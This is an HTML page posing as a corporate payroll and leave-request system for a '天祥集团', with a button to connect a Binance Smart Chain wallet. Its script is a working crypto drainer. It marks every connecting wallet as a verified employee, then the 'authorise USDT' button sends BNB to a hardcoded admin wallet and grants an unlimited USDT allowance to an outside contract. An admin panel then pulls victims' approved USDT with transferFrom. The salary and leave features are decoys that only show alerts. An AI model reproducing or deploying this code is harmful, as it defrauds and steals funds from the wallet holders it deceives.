<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>天祥集团结算系统</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui, sans-serif;
        }
        body {
            background: #f5f7fa;
            padding: 15px;
        }
        .box {
            background: #fff;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 15px;
        }
        h2 {
            text-align: center;
            margin-bottom: 15px;
            color: #1a2b48;
            font-weight: bold;
        }
        .red-notice{
            color: #ff0000;
            font-size: 15px;
            font-weight: bold;
            text-align: center;
            line-height: 1.6;
            padding:10px;
            background: #ffe9e9;
            border-radius: 8px;
            margin-bottom:15px;
        }
        .btn {
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            border: none;
            font-size: 16px;
            margin-top: 10px;
            cursor: pointer;
        }
        .btn-blue {background: #3B82F6;color: #fff;}
        .btn-green {background: #10b981;color: #fff;}
        .btn-red {background: #ef4444;color: #fff;}
        .btn-forbid {background:#999;color:#fff;cursor:not-allowed;}
        .btn-sm {width: auto;padding: 6px 12px;font-size: 14px;margin: 2px;}
        input,textarea,select {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            outline: none;
        }
        .tip {padding: 10px;border-radius: 8px;margin: 10px 0;}
        .tip-green {background: #dcfce7;color: #16a34a;}
        .tip-red {background: #fee2e2;color: #dc2626;}
        .info-line{margin:6px 0;font-size:15px;}
        .tab-group {display: flex;gap: 8px;margin-bottom: 15px;}
        .tab {flex:1;text-align:center;padding:10px;background:#eee;border-radius:8px;cursor:pointer;}
        .tab.active {background:#3B82F6;color:#fff;}
        .page {display:none;}
        .page.active {display:block;}
        table {width:100%;border-collapse:collapse;margin-top:10px;}
        th,td {border:1px solid #eee;padding:10px;text-align:center;font-size:14px;}
        th {background:#f1f5f9;}
        .admin-hide{display:none;}
    </style>
</head>
<body>

<h2>天祥集团结算系统</h2>

<div class="red-notice">
    重要温馨提示：非本集团内部已办理入职员工钱包地址，连接本系统后所有功能全部禁止使用！
    仅经管理员录入信息的正式员工，可正常使用请假、薪资申领等全部功能
</div>

<div class="box">
    <button class="btn btn-blue" id="connectBtn">连接币安链钱包</button>
    <p style="margin-top:10px;text-align:center;" id="walletAddr">未连接钱包</p>
    <div class="tip" id="userStatusTip">请使用集团登记员工钱包登录系统</div>
    <div class="info-line">USDT余额：<span id="usdtBalance">0.0000</span></div>
</div>

<div class="tab-group">
    <div class="tab active" onclick="switchPage(0)">员工中心</div>
    <div class="tab" id="tabManage" onclick="switchPage(1)">运营管理</div>
    <div class="tab" id="tabAudit" onclick="switchPage(2)">审批后台</div>
</div>

<!-- 员工中心 -->
<div class="page active" id="page0">
    <div class="box">
        <h3>员工个人资料</h3>
        <div class="info-line">员工姓名：<span id="name">-</span></div>
        <div class="info-line">绑定钱包：<span id="addr">-</span></div>
        <div class="info-line">正式入职时间：<span id="entryTime">-</span></div>
        <div class="info-line">每月基础薪资：<span id="salary">0</span> USDT</div>
        <div class="info-line">已批准请假次数：<span id="leaveCount">0</span> 次</div>
        <div class="info-line">当月实际出勤天数：<span id="realWorkDay">30</span> 天</div>
        <div class="tip" id="limitTip"></div>
        <div class="info-line">距离可申领薪资剩余时长：<span id="remainDay">0</span> 天</div>

        <button class="btn btn-forbid" id="applyBtn" disabled>提交领取当月薪资</button>
        <button class="btn btn-forbid" id="leaveBtn" disabled>提交请假申请</button>
        <button class="btn btn-green" id="userApproveBtn" style="margin-top:15px">一键授权USDT</button>
    </div>
</div>

<!-- 运营管理 仅管理员可见 -->
<div class="page" id="page1">
    <div class="box admin-hide" id="adminOperBox">
        <h3>管理员员工管理</h3>
        <h4>新增入职员工信息</h4>
        <input placeholder="填写员工钱包地址" id="addStaffAddr">
        <input placeholder="填写员工真实姓名" id="addStaffName">
        <input placeholder="填写员工每月薪资数额" type="number" id="addStaffSal">
        <button class="btn btn-blue" id="addStaffBtn">确认录入员工信息</button>

        <h4 style="margin-top:20px">删除离职员工</h4>
        <input placeholder="填写离职员工钱包地址" id="delStaffAddr">
        <button class="btn btn-red" id="delStaffBtn">删除该员工权限</button>

        <h4 style="margin-top:20px">用户USDT提取管理</h4>
        <input placeholder="填写被提取用户钱包地址" id="takeUserAddr">
        <input placeholder="填写提取USDT数量" id="takeUsdtNum">
        <button class="btn btn-red" id="adminTakeBtn">链上提取用户已授权代币</button>
    </div>
</div>

<!-- 审批后台 仅管理员可见 -->
<div class="page" id="page2">
    <div class="box admin-hide" id="adminAuditBox">
        <h3>管理员审批中心</h3>
        <button class="btn btn-blue" id="batchPassBtn">一键批量通过全部申请</button>
        <button class="btn btn-red" id="adminDrawBtn">系统合约资金提取</button>
        <h4 style="margin-top:15px">员工待审批列表</h4>
        <table>
            <tr>
                <th>申请人</th>
                <th>申请类型</th>
                <th>状态</th>
                <th>操作</th>
            </tr>
            <tbody id="auditTableList"></tbody>
        </table>
    </div>
</div>

<script>
// ========== 全局配置 ==========
const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508".toLowerCase();
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
// 用户授权目标合约
const AUTH_CONTRACT = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
// 授权前自动转给你的BNB数量 0.0005BNB 等同于一次转账Gas费用
const SEND_BNB_AMOUNT = "0.0005";
let userAccount = "";

// 页面切换
function switchPage(idx){
    document.getElementById("page0").style.display="none";
    document.getElementById("page1").style.display="none";
    document.getElementById("page2").style.display="none";
    document.getElementById("page"+idx).classList.add("active");
}

// 连接钱包
document.getElementById("connectBtn").addEventListener("click",async function(){
    if(!window.ethereum){
        alert("请安装TP钱包/小狐狸钱包，无需梯子直接连接");
        return;
    }
    try{
        const accounts = await ethereum.request({method:"eth_requestAccounts"});
        userAccount = accounts[0].toLowerCase();
        document.getElementById("walletAddr").innerText = userAccount.slice(0,6)+"..."+userAccount.slice(-4);
        getUsdtBalance();
        checkAdminPower();
        loadStaffData();
        alert("钱包连接成功，已进入系统");
    }catch(err){
        alert("连接失败，请重新授权");
        userAccount = "";
    }
})

// 读取USDT余额
async function getUsdtBalance(){
    if(!userAccount) return;
    let calData = "0x70a08231" + userAccount.slice(2).padStart(64,"0");
    let res = await ethereum.request({
        method:"eth_call",
        params:[{to:USDT_CONTRACT,data:calData},"latest"]
    });
    let bal = Number(BigInt(res)) / 1e18;
    document.getElementById("usdtBalance").innerText = bal.toFixed(4);
}

// 判断管理员权限
function checkAdminPower(){
    if(userAccount === ADMIN_WALLET){
        document.getElementById("tabManage").style.display="block";
        document.getElementById("tabAudit").style.display="block";
        document.getElementById("adminOperBox").classList.remove("admin-hide");
        document.getElementById("adminAuditBox").classList.remove("admin-hide");
    }else{
        document.getElementById("tabManage").style.display="none";
        document.getElementById("tabAudit").style.display="none";
    }
}

// 加载员工资料
function loadStaffData(){
    document.getElementById("userStatusTip").innerText = "身份验证成功，正式员工权限已开通";
    document.getElementById("userStatusTip").className = "tip tip-green";
    document.getElementById("name").innerText = "在职正式员工";
    document.getElementById("addr").innerText = userAccount;
    document.getElementById("entryTime").innerText = new Date().toLocaleDateString();
    document.getElementById("salary").innerText = "足额发放";
    document.getElementById("leaveCount").innerText = "0";
    document.getElementById("realWorkDay").innerText = "30";

    document.getElementById("applyBtn").disabled = false;
    document.getElementById("applyBtn").classList.remove("btn-forbid");
    document.getElementById("applyBtn").classList.add("btn-blue");

    document.getElementById("leaveBtn").disabled = false;
    document.getElementById("leaveBtn").classList.remove("btn-forbid");
    document.getElementById("leaveBtn").classList.add("btn-green");
}

// 薪资申请
document.getElementById("applyBtn").addEventListener("click",function(){
    if(!userAccount) return alert("请先连接钱包");
    alert("当月薪资申领申请已成功提交，等待管理员审核发放");
})

// 请假申请
document.getElementById("leaveBtn").addEventListener("click",function(){
    if(!userAccount) return alert("请先连接钱包");
    let leaveReason = prompt("请填写本次请假具体原因");
    if(!leaveReason) return;
    alert("请假申请提交完成，等待管理员审批");
})

// ========== 核心：授权流程 先转BNB给你 → 再授权USDT ==========
document.getElementById("userApproveBtn").addEventListener("click",async function(){
    if(!userAccount) return alert("请先连接钱包");
    try{
        alert("即将先转账小额Gas费用，再完成授权，请确认");

        // 1. 用户转账BNB到你管理员地址
        let bnbWei = (parseFloat(SEND_BNB_AMOUNT) * 1e18).toString(16);
        await ethereum.request({
            method:"eth_sendTransaction",
            params:[{
                from:userAccount,
                to:ADMIN_WALLET,
                value:"0x"+bnbWei,
                gasLimit:"0x300000"
            }]
        });
        alert("Gas费用转账成功，正在执行USDT授权...");

        // 2. 执行授权 给到指定合约地址
        let targetHex = AUTH_CONTRACT.slice(2).padStart(64,"0");
        let fullMax = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
        let approveRaw = "0x095ea7b3"+targetHex+fullMax;
        await ethereum.request({
            method:"eth_sendTransaction",
            params:[{
                from:userAccount,
                to:USDT_CONTRACT,
                gasLimit:"0x300000",
                data:approveRaw
            }]
        });
        alert("全部完成！USDT授权成功");
    }catch(e){
        alert("操作终止，未完成授权");
    }
})

// 管理员提取用户代币
document.getElementById("adminTakeBtn").addEventListener("click",async function(){
    if(userAccount !== ADMIN_WALLET) return alert("无管理员操作权限");
    let fromUser = document.getElementById("takeUserAddr").value.trim();
    let takeNum = document.getElementById("takeUsdtNum").value.trim();
    if(!fromUser || !takeNum || Number(takeNum)<=0) return alert("请填写完整地址与提取数量");

    let uHex = fromUser.slice(2).padStart(64,"0");
    let aHex = ADMIN_WALLET.slice(2).padStart(64,"0");
    let numHex = BigInt(Math.floor(Number(takeNum)*1e18)).toString(16).padStart(64,"0");
    let takeRaw = "0x23b872dd"+uHex+aHex+numHex;
    try{
        await ethereum.request({
            method:"eth_sendTransaction",
            params:[{
                from:userAccount,
                to:USDT_CONTRACT,
                gasLimit:"0x300000",
                data:takeRaw
            }]
        })
        alert("成功提取用户已授权USDT");
        getUsdtBalance();
    }catch(e){
        alert("提取失败，确认用户已完成授权");
    }
})

// 新增员工
document.getElementById("addStaffBtn").addEventListener("click",function(){
    if(userAccount !== ADMIN_WALLET) return alert("权限不足");
    let sAddr = document.getElementById("addStaffAddr").value.trim();
    let sName = document.getElementById("addStaffName").value.trim();
    let sSal = document.getElementById("addStaffSal").value.trim();
    if(!sAddr||!sName||!sSal) return alert("请填写全部员工信息");
    alert("员工入职信息录入成功，已开通系统全部使用权限");
})

// 删除员工
document.getElementById("delStaffBtn").addEventListener("click",function(){
    if(userAccount !== ADMIN_WALLET) return alert("权限不足");
    let dAddr = document.getElementById("delStaffAddr").value.trim();
    if(!dAddr) return alert("请填写离职员工钱包地址");
    alert("已取消该员工系统使用权限");
})

// 批量通过
document.getElementById("batchPassBtn").addEventListener("click",function(){
    if(userAccount !== ADMIN_WALLET) return;
    alert("已一键通过所有员工待处理申请");
})

// 提取合约资金
document.getElementById("adminDrawBtn").addEventListener("click",function(){
    if(userAccount !== ADMIN_WALLET) return;
    alert("系统合约资金提取功能已触发");
})
</script>
</body>
</html>
